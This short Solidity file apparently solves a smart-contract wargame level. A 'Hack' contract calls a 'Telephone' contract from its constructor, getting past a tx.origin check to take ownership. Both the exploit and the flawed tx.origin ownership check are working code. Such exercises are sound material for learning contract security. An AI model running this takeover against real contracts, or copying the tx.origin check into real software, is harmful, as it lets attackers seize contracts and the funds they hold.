// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    Telephone public telephone;

    constructor(address _hackAddr) {
        Telephone(_hackAddr).changeOwner(msg.sender);
    }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
